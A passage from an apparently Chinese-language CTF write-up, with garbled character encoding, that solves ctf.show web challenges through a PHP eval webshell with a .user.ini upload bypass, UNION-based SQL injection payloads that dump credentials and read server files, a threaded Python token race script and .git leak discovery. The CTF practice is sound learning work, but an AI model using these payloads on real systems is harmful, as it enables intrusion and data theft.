invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p> è¿™é‡Œè¦æ±‚æ–‡ä»¶çš„å­—ç¬¦æ•°è¦ä¸å¤§äº24 åå­—ä¸å¤§äº9ä¸ªå­—ç¬¦ åç¼€ä¸å¤§äº3ä¸ªå­—ç¬¦ è€Œä¸”ä¸è®©ä¸Šä¼ phpæ–‡ä»¶<br> æ‰€ä»¥æˆ‘ä»¬åœ¨a.txtä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå…ˆ<br>åœ¨ php ä¸­ â€œ.user.iniâ€ æœ‰å¦‚ä¸‹è§£é‡Šï¼šphp ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æœå¯»æ–‡ä»¶åï¼Œå¦‚æœè®¾å®šä¸ºç©ºå­—ç¬¦ä¸²åˆ™ php ä¸ä¼šæœå¯»ï¼Œä¹Ÿå°±æ˜¯åœ¨ â€œ.user.iniâ€ ä¸­å¦‚æœè®¾ç½®äº†æ–‡ä»¶åï¼Œé‚£ä¹ˆä»»æ„ä¸€ä¸ªé¡µé¢éƒ½å°†è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹åŒ…å«è¿›å»ã€‚æœ‰ä¸¤ç§æ–¹æ³•ï¼š<br>auto_prepend_file: åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶<br>auto_append_file: åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶<br>å…ˆå†™è¿™ä¸ª.user.iniæ–‡ä»¶å¹¶ä¸Šä¼  ç„¶åå†ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„.txtæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a.txt</span></span><br><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="comment">#å› ä¸ºå­—ç¬¦æ•°é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½å†™è¿™äº›</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line">auto_append_file=a.txt</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯ç”¨èšå‰‘è¿æ¥ä¹‹åçœ‹ä¸åˆ°æ•°æ®ï¼Œæˆ‘ä»¬å°±ç”¨postè¯·æ±‚ä¼ å…¥a ç”¨globæ‰¾åˆ°ç›®å½•<br><img src="https://pic1.imgdb.cn/item/67ac63cdd0e0a243d4fe97f9.png" alt="|500"><br>ç„¶åå†å’Œweb12ä¸€æ ·ç”¨highlight_file()è¯»å–æ–‡ä»¶ (æ³¨æ„ç”¨å•å¼•å·åŒ…è£¹æ–‡ä»¶)</p>
<h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;Â Â Â Â <span class="variable">$cÂ </span>=Â <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);Â Â Â Â <span class="title function_ invoke__">sleep</span>(<span class="variable">$c</span>);  </span><br><span class="line">Â Â Â Â <span class="keyword">switch</span><span class="title function_ invoke__">Â </span>(<span class="variable">$c</span>)Â &#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">1</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;$url&#x27;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">2</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">555555</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$url</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">44444</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;@A@&quot;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">3333</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$url</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">222</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">222</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">3333</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$url</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">44444</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">555555</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$url</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">3</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">6000000</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">case</span>Â <span class="number">1</span>:  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œcå‚æ•°é€‰æ‹©3çš„æ—¶å€™ï¼Œæ²¡æœ‰breakï¼Œä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œ<br>å‡ºç°<code>@A@here_1s_your_f1ag.php@A@</code>æç¤º è¿›å…¥è¿™ä¸ªphp æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢<br>ä¸‹ä¸€æ­¥å°±æ˜¯sqlæ³¨å…¥äº†<br>æŸ¥çœ‹æºç  å‘ç°è¿‡æ»¤çš„ä¸œè¥¿  ç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">&lt;!--</span>|</span><br><span class="line">||<span class="string">if(preg_match(&#x27;/information_schema\.tables\</span>|<span class="string">information_schema\.columns\</span>|<span class="string">linestring\</span>|<span class="string"> \</span>|<span class="string">polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123;</span>|</span><br><span class="line">||<span class="string">die(&#x27;@A@&#x27;);</span>|</span><br><span class="line">||<span class="string">&#125;</span>|</span><br><span class="line">||<span class="string">--&gt;</span>|</span><br></pre></td></tr></table></figure></div>
<p>ç©ºæ ¼çš„ç»•è¿‡æˆ‘ä»¬å­¦è¿‡ï¼Œè¿™é‡Œæ²¡æœ‰è¿‡æ»¤åå¼•å·<br>åå¼•å·ï¼šå®ƒæ˜¯ä¸ºäº†åŒºåˆ† MYSQL çš„ä¿ç•™å­—ä¸æ™®é€šå­—ç¬¦è€Œå¼•å…¥çš„ç¬¦å·ã€‚<br>æ¥ä¸‹æ¥å°±æ˜¯sqlæ³¨å…¥çš„éƒ¨åˆ†äº†ï¼š<br>1.çˆ†åº“ï¼š<code>-1/**/union/**/select/**/database();</code> å¾—åˆ°åº“åweb<br>2.çˆ†è¡¨ï¼š<code>-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.</code>tables<code>/**/where/**/table_schema=database();</code> å¾—åˆ°è¡¨åcontent<br>3.çˆ†å­—æ®µï¼š<code>-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.</code>columns<code>/**/where/**/table_name=&#39;content&#39;;</code> å¾—åˆ°id,username,password<br>4.çˆ†å€¼ï¼š <code>-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/web.content;</code><br>æ²¡æœ‰ç›´æ¥ç»™å‡ºflagä½†æ˜¯ç»™äº†ä¸€äº›æç¤º<br><img src="/CTFshow.assets/image-20250204223159587.png"><br>æç¤ºsecret  æ‰€ä»¥è®¿é—®secret.php<br>è¦ç”¨load_file()å‡½æ•°è¯»å–è¿™ä¸ªæ–‡ä»¶<br><code>-1/**/union/**/select/**/load_file(&#39;/var/www/html/secret.php&#39;)</code> ä½†æ˜¯å‘çˆ¹çš„æ˜¯ï¼Œæ²¡æœ‰ç›´æ¥å›æ˜¾ï¼ŒæŸ¥çœ‹æºç å‘ç°æœ‰å¤šäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">   </span>|</span><br><span class="line">|<span class="string">---</span>|</span><br><span class="line">|<span class="string">&lt;script&gt;alert(&#x27;&lt;!-- ReadMe --&gt;</span>|</span><br><span class="line">||<span class="string">&lt;?php</span>|</span><br><span class="line">||<span class="string">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span>|</span><br><span class="line">||<span class="string">$file = &#x27;/tmp/gtf1y&#x27;;</span>|</span><br><span class="line">||<span class="string">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span>|</span><br><span class="line">||<span class="string">echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span>|</span><br><span class="line">||<span class="string">&#125;&#x27;)&lt;/script&gt;</span>|</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥å†ç”¨load_fileè¯» </p>
<h1 id="çº¢åŒ…é¢˜ç¬¬å…­å¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬å…­å¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬å…­å¼¹"></a>çº¢åŒ…é¢˜ç¬¬å…­å¼¹</h1><p>è¿™é¢˜æˆ‘æ„Ÿè§‰ç‰¹åˆ«éš¾ï¼Œçœ‹ç€wpè¯•ç€ç†è§£ä¸€ä¸‹ï¼Œé¦–å…ˆè¿™ä¸ªé¢˜ç›®ç»™äº†ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½†æ˜¯æç¤ºè¯´ä¸æ˜¯sqlæ³¨å…¥éœ€è¦æ‰¾åˆ°å…³é”®æºç ã€‚<br>æ‰«ä¸€ä¸‹ç½‘ç«™çš„ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat /root/tmp/reports/https_f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/__<span class="number">25-02-05_15</span>-<span class="number">07</span>-<span class="number">10</span>.txt | grep &quot;.zip&quot;</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/vb.zip</span><br><span class="line"><span class="number">200</span> Â  <span class="number">576</span>B Â  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/web.zip</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/website.zip</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wordpress.zip</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wp-config.php.zip</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wp.zip</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/wwwroot.zip</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/www.zip</span><br><span class="line"><span class="number">200</span> Â  Â  <span class="number">2</span>KBÂ  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/zipkin/</span><br></pre></td></tr></table></figure></div>
<p>æœç´¢zipçš„æ–‡ä»¶ï¼Œç„¶åæŠŠè¿™ä¸ªweb.zipä¸‹è½½ä¸‹æ¥ ï¼Œ è¿™æ˜¯ç½‘ç«™æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;äººè„¸è¯†åˆ«æˆåŠŸ!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥çœ‹åˆ°ä¸­æºç ä¸­æœ‰å¯¹tokenåšåˆ¤æ–­ã€‚å¯ä»¥æŠ“åŒ…çœ‹çœ‹ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/check.php?token=1f0e3dad99908345f7439f8ffabdffc4&amp;php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>27</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://f991d1d6-f578-4825-a048-004c12279240.challenge.ctf.show/vb.zip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-nginx"><span class="attribute">username</span> or password <span class="literal">error</span>!</span></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°åœ¨ç¬¬ä¸€è¡Œè¿™é‡Œç¡®å®è·Ÿäº†ä¸€ä¸ªtoken æˆ‘è§£å¯†å‡ºæ¥è¿™ä¸ªmd5å¯¹åº”çš„å€¼æ˜¯19<br>æºç ä¸­çš„é€»è¾‘æ˜¯è®¾ç½®äº†ä¸€ä¸ª receivefile ä¸º flag.datï¼Œç„¶åè°ƒç”¨ receiveStreamFile($receiveFile);ï¼Œå¯ä»¥å‘ç°æ˜¯éœ€è¦ç”¨ php:&#x2F;&#x2F;input è·å–æ–‡ä»¶æµï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥éœ€è¦è‡ªå·±ä¼ ä¸Šå»çš„æ–‡ä»¶ä¸å·²å­˜åœ¨çš„ key.dat çš„ MD5 è¦ä¸€è‡´ï¼Œsha512 ä¸ä¸€è‡´ï¼Œå³å¯æ‰“å°å‡º flag<br>æ‰€ä»¥é¦–å…ˆè¦è·å–è¿™ä¸ªkey.dat å¯ä»¥ä»urlå¤„ç›´æ¥ä¸‹è½½  æ¥ä¸‹æ¥æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶çš„md5è¦ä¸€æ · sha512ä¸ä¸€æ · éœ€è¦ç”¨pythonå®ç°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œä¸ºä»€ä¹ˆç”¨åˆ†é’Ÿæ•°ç”Ÿæˆï¼šå› ä¸ºé€šè¿‡æŠ“åŒ…å‘ç°æ”¹å˜åˆ†é’Ÿåtokenå€¼æ‰ä¼šå˜åŒ–</span></span><br><span class="line">i = <span class="built_in">str</span>(time.localtime().tm_min)</span><br><span class="line"><span class="comment"># ç”Ÿæˆtoken</span></span><br><span class="line">m = hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">url = <span class="string">&quot;https://ad0204ed-4869-4879-96b1-fa5681393cdb.challenge.ctf.show/check.php?token=&#123;&#125;&amp;php://input&quot;</span>.<span class="built_in">format</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;something went wrong!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/Users/kakeru/ctf/key.dat&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> t:</span><br><span class="line">    data1 = t.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=POST, args=(data1,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    data2 = <span class="string">&#x27;emmmmm&#x27;</span></span><br><span class="line">    threading.Thread(target=POST, args=(data2,)).start()</span><br></pre></td></tr></table></figure></div>
<h1 id="çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹"><a href="#çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹" class="headerlink" title="çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹"></a>çº¢åŒ…é¢˜ç¬¬ä¸ƒå¼¹</h1><p><img src="https://pic1.imgdb.cn/item/67ac63a3d0e0a243d4fe97df.png"><br>é¢˜ç›®å°±ç»™äº†ä¸€ä¸ªphpinfoçš„ç•Œé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ï¼Œç”¨dirsearchæ‰«æä¸€ä¸‹ç›®å½• æ‰«ä¸€ä¸‹PHPæ–‡ä»¶<br>è¿™é¢˜è€ƒæŸ¥çš„æ˜¯.gitæ³„æ¼   ç›®å½•æ‰«æä¹‹åä¼šæ‰¾åˆ°ä¸€ä¸ª&#x2F;.git&#x2F;indexæ–‡ä»¶<br>åœ¨linuxä¸­æŸ¥çœ‹è¿™ä¸ªindexçš„å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">DIRC</span>^J??<span class="number">9</span>??^Jw?!&#x27;???U??<span class="number">0</span>wQW?<span class="number">8</span>??&gt;&amp;?=??&lt;&lt;</span><br><span class="line"></span><br><span class="line">Â Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="attribute">backdoor</span>.php^J??<span class="number">8</span>?ÑŒ^Jw? ?<span class="number">1</span>???Am<span class="string">&quot;?~?]?I???t? ??? index.phpTREE2 0</span></span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸€ä¸ªbackdoor.phpæ–‡ä»¶ï¼Œå»çœ‹çœ‹æ˜¯ä»€ä¹ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 36Då§‘å¨˜ç•™çš„åé—¨ï¼Œé—²äººå…è¿› --&gt;</span></span><br></pre></td></tr></table></figure></div>
